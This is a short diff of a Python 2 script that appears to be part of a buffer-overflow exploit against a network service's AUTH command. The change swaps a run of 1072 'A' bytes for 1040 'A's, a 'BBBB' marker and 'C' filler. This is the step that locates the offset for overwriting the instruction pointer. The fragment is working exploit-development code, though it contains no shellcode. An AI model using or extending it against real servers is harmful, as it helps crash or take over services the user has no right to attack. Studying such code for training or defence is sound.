@@ -9,12 +9,9 @@ except IndexError:
     print "[+] Usage %s host" % sys.argv[0]
     sys.exit()
 
-req1 = "AUTH " + "\x41"*1072
-
+req1 = "AUTH " + "\x41"*1040 + "\x42\x42\x42\x42" + "C" * (1072 - 1040 -4)
 
 s = so.socket(so.AF_INET, so.SOCK_STREAM)
-
-
 try:
      s.connect((server, port))
      print repr(s.recv(1024))
